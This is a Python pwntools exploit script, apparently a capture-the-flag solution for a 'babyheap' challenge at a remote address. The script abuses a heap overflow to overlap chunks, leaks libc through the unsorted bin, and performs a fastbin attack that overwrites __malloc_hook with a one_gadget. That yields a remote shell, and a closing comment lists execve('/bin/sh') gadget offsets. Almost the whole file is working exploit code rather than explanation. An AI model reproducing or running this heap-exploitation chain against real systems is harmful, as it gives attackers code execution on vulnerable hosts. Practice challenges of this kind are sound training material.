from pwn import *

# p = process("./babyheap")
p = remote("111.198.29.45" , 30795)
elf = ELF("./babyheap")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc-2.23.so")
# context.log_level = "debug"

cmd = lambda c : p.sendlineafter(">> " , str(c))
def new(size , content):
	cmd(1)
	p.sendline(str(size))
	p.send(content)

def edit(idx , size , content):
	cmd(2)
	p.sendline(str(idx))
	p.sendline(str(size))
	p.send(content)

def show(idx):
	cmd(3)
	p.sendline(str(idx))

def free(idx):
	cmd(4)
	p.sendline(str(idx))
# for leak libc and heap attack
new(0x40 , "a" * 0x40) # 0 # /x00
new(0x40 , "b" * 0x40) # 1 # /x50
new(0x100 , ("c" * 0x20 + p64(0x60) + p64(0x20)).ljust(0x100 , "c")) # 2 # /xa0
new(0x20 , "e" * 0x20) # 3 
new(0x60 , "f" * 0x60) # 4 
# for leak heap
# leak libc
edit(0 , 0x50 , "a" * 0x40 + p64(0x50) + p64(0x81))
free(1)
new(0x70 , "b" * 0x40 + p64(0x50) + p64(0x111) + "b" * 0x20)
free(2)
show(1)
p.recv(0x50)
unsorted_bin = u64(p.recv(8))
libc.address = unsorted_bin - 88 - 0x3c4b20
log.info("libc : " + hex(libc.address))
malloc_hook = libc.sym["__malloc_hook"]
log.info("malloc_hook : " + hex(malloc_hook))
new(0x100 , "c" * 0x100)

free(4)
edit(3 , 0x38 , "e" * 0x20 + p64(0x30) + p64(0x71) + p64(malloc_hook - 0x23))
new(0x60 , "f" * 0x60)
one_gadget = libc.address + 0x4526a
payload = "\x00" * 0x13  + p64(one_gadget)
payload = payload.ljust(0x60 ,"\x00")
new(0x60 ,  payload)
cmd(1)
p.sendline(str(0x30))
p.interactive()


"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0274	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1117	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""